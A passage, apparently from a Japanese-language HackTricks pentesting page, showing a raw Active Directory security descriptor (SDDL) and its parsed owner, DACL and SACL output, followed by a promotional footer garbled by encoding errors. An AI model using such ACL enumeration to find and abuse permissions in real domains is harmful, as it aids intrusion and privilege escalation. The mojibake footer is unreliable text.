3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
